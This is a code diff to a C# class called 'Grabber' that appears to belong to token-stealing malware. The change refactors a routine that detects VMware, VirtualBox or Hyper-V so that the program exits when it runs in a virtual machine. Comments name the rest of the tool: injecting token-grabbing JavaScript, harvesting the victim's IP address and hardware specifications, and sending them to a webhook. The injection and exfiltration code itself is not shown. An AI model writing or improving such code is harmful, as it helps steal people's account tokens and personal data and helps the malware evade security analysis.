@@ -12,7 +12,7 @@ namespace Furious
 {
     public class Grabber
     {
-		public static void CheckForVM()
+		public static bool UsingVM()
 		{
 			///If the process is running within a Virtual Machine, the process will close before executing code.
 			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
@@ -25,19 +25,25 @@ namespace Furious
 						if ((text == "microsoft corporation" && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || text.Contains("vmware") || managementBaseObject["Model"].ToString() == "VirtualBox")
 						{
 							Console.WriteLine("Using VM: true");
-							Environment.Exit(0);
+							return true;
 						}
 					}
 				}
 			}
 			Console.WriteLine("Using VM: false");
+			return false;
 		}
 
 		public static async Task QuickStart(bool injectJS = false, bool grabIP = false, bool grabHardware = false, bool checkForVM = false)
 		{
 			///This method allows the user to customise what data is collected, whether they want to inject the token grabbing code, and choose to check for a virtual machine.
 			if (checkForVM)
-				CheckForVM();
+			{
+				if (UsingVM())
+				{
+					Environment.Exit(0);
+				}
+			}
 			if (injectJS)
 				await InjectJS();
 			if (grabIP)
@@ -106,7 +112,7 @@ namespace Furious
 		}
 
 		public static async Task<string> GetHardware()
-        {
+		{
 			///This method collects the users hardware specifications which can be sent to a webhook using the SendData method.
 			StringBuilder sb = new StringBuilder();
 
